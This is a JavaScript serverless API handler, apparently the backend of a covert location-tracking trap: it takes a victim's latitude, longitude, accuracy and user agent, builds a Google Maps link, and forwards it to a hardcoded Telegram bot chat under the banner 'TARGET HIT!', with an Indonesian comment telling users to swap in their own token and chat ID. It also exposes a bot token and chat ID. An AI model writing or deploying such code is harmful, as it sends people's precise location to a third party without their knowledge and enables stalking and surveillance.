export default async function handler(req, res) {
    if (req.method !== 'POST') return res.status(405).send('Method Not Allowed');

    const { lat, lon, acc, ua } = req.body;
    
    // --- GANTI DENGAN DATA LO ---
    const TOKEN = '8356478832:AAF3L_qYj0NSENOXuuwn-PAJBBAiCiQVnGI';
    const CHAT_ID = '6576965530';

    const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
    const text = `🚀 **TARGET HIT!** 🚀\n\n🎯 **Accuracy:** ${acc}m\n📍 **Maps:** ${mapLink}\n📱 **Device:** ${ua}`;

    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
        });
        return res.status(200).json({ status: 'ok' });
    } catch (e) {
        return res.status(500).json({ error: e.message });
    }
}
